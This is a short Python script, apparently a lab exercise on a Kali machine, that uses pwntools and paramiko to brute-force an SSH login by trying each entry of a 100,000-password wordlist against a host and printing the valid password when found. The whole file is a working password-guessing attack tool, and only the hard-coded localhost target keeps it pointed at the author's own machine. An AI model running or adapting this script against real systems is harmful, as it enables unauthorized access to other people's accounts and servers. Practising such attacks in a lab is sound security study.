from pwn import *
import paramiko

#host = "ip of host machine to perform bruteforce on.
#username = name of machine
host = "127.0.0.1"
username = "kali"
attempts = 0

# opening ssh-common-passwords.txt file and reading it. Then save it as password_list
with open("/home/kali/Downloads/10-million-password-list-top-100000.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:                                    #using "try" to handle authentication errors 
			print("[{}] Attempting password '{}'!".format(attempts , password))	
			response = ssh(host=host , user= username, password=password, timeout= 1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password")
		attempts += 1	
